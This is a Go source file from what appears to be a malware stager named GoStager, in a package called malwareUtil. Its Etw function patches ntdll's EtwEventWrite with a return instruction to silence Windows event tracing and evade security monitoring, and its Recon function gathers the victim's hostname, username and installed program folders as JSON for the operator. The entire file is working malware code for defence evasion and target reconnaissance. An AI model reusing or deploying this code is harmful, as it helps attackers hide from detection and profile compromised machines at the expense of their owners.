package malwareUtil

import (
	"GoStager/cmd/util"
	"encoding/json"
	"golang.org/x/sys/windows"
	"os"
	"unsafe"
)

var (
	fntdll  = windows.NewLazyDLL("ntdll.dll")
	fucketw = fntdll.NewProc("EtwEventWrite")

	k32                = windows.NewLazyDLL("kernel32.dll")
	WriteProcessMemory = k32.NewProc("WriteProcessMemory")
)

// https://github.com/timwhitez/Doge-Assembly/blob/main/loader/etw.go
func Etw(hProcess uintptr) {
	var oldProtect uint32
	var patch = []byte{0xc3}

	windows.VirtualProtect(fucketw.Addr(), 1, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	WriteProcessMemory.Call(hProcess, fucketw.Addr(), uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
	windows.VirtualProtect(fucketw.Addr(), 1, oldProtect, &oldProtect)
}

// Recon does some basic recon on the target
func Recon() []byte {
	var iniCheck util.InitialChecks
	// print machine name
	iniCheck.Hostname, _ = os.Hostname()
	//print username
	iniCheck.Username = os.Getenv("USERNAME")
	dir, _ := os.ReadDir("C:\\Program Files")
	for _, file := range dir {
		iniCheck.Dir = append(iniCheck.Dir, file.Name())
	}
	dir86, _ := os.ReadDir("C:\\Program Files (x86)")
	for _, file := range dir86 {
		iniCheck.Dir = append(iniCheck.Dir, file.Name())
	}
	j, _ := json.Marshal(iniCheck)
	return j
}
